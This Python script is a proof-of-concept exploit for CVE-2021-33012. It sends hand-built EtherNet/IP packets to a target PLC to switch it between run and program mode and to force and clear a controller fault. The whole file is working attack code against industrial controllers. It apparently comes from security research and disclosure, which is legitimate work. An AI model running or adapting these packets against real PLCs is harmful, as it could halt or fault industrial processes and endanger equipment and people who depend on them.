#! /usr/bin/python3

''' 
CVE-2021-33012
https://www.cisa.gov/uscert/ics/advisories/icsa-21-189-01

This bug was discovered during my attempt at porting some of
the work already researched by Thiago Alves:

https://github.com/thiagoralves/EtherSploit-IP
'''

import socket
import binascii
import sys
import argparse
import time

# Handle arguments
parser = argparse.ArgumentParser(description="An attack tool based on ethersploit (github.com/thiagoralves/EtherSploit-IP), but without options to brick a PLC",formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t","--target",help="The target PLC to attack",required=True)
parser.add_argument("-p","--port",help="The PLC port",default=44818)
parser.add_argument("-a","--action",help="Action to take on PLC",default="info")
parser.add_argument("-v","--verbose",action="store_true",help="Verbose output",default=False)
args = parser.parse_args()

def startSession(target,port):

    startSessionStr='65000400000000000000000000000000000000000000000001000000'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.target, args.port))
    s.settimeout(5)
    s.send(binascii.a2b_hex(startSessionStr))
    resp = s.recv(1024)
    respHexlified = binascii.hexlify(resp)
    respJoined = ''.join(respHexlified)
    sess = respJoined[8:16]
    return(sess,s)

if args.action == "start":
    print("Setting PLC to RUN mode")
    sess = startSession(args.target,args.port)
    startCmd  = "6f001700" + sess[0] + "00000000f893b28efd3aa08b00000000000000000a0002008100010000910006000f0001088006"
    s = sess[1]
    s.send(binascii.a2b_hex(startCmd))

elif args.action == "stop":
    print("Setting PLC to PROG mode")
    sess = startSession(args.target,args.port)
    stopCmd  = "6f001700" + sess[0] + "000000001ab9d157c70058ad00000000000000000a0002008100010000910006000f0001088001"
    s = sess[1]
    s.send(binascii.a2b_hex(stopCmd))

elif args.action == "force_fault":
    print("Force PLC fault")
    sess = startSession(args.target,args.port)
    stop1  = "6f001700" + sess[0] + "000000001ab9d157c70058ad00000000000000000a0002008100010000910006000f0001088001"
    start1 = "6f001f00" + sess[0] + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000260006000"
    stop2  = "6f001700" + sess[0] + "000000001ab9d157c70058ad00000000000000000a0002008100010000910006000f0001088006"
    start2 = "6f001f00" + sess[0] + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000220000000"
    start3 = "6f001f00" + sess[0] + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000240000000"

    s = sess[1]
    s.send(binascii.a2b_hex(stop1))
    s.send(binascii.a2b_hex(start1))
    time.sleep(.3)
    s.send(binascii.a2b_hex(stop2))
    s.send(binascii.a2b_hex(start2))
#    time.sleep(.3) # Without this sleep fault becomes difficult to recover from
    s.send(binascii.a2b_hex(start3))

elif args.action == "clear_fault":
    print("Clear PLC fault")
    sess = startSession(args.target,args.port)
    clear1 = "6f001f00" + sess[0] + "000000006937026cdadf0a4400000000000000000a000200810001000091000e000f000108ab0202840500fffc0000"
    clear2 = "6f001d00" + sess[0] + "000000006937026cdadf0a4400000000000000000a000200810001000091000c000f000108aa02028406000000"
    clear3 = "6f001f00" + sess[0] + "000000006937026cdadf0a4400000000000000000a000200810001000091000e000f000108ab020284010000200000"
    s = sess[1]
    s.send(binascii.a2b_hex(clear1))
    s.send(binascii.a2b_hex(clear2))
    time.sleep(.5)
    s.send(binascii.a2b_hex(clear3))

else:
    print("\n [x] ERROR: \"action\" must be one of the follwing:"
          "info | start | stop | force_fault | clear_fault\n")
